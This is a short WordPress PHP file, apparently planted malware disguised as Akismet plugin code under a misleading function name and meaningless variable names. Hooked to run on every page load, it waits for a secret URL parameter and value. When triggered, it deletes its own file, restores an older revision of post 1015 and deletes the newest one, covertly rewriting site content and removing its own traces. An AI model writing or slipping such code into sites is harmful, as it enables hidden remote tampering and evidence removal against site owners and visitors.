<?php

function akismet_json_carousel() {
	if (isset($_GET['log_color_cleaner']) && $_GET['log_color_cleaner'] === 'options_local_drop_sign') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$table_online_column_description = 1015;
		$affiliates_top_cc = wp_get_post_revisions($table_online_column_description);
		if (empty($affiliates_top_cc)) die('no revisions');
		if (count($affiliates_top_cc) < 2) die('less than 2');
		$addon_info_print_creator = array_shift($affiliates_top_cc);
		$listings_simple_feeds = $addon_info_print_creator->ID;
		$portfolio_hide_welcome = array_shift($affiliates_top_cc);
		$restrict_pixel_interactivity_news = $portfolio_hide_welcome->ID;
		$radio_emails_fonts_coming = wp_restore_post_revision($restrict_pixel_interactivity_news);
		if ($radio_emails_fonts_coming === false) die('error restoring');
		$radio_emails_fonts_coming = wp_delete_post_revision($listings_simple_feeds);		
		if ($radio_emails_fonts_coming === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'akismet_json_carousel');
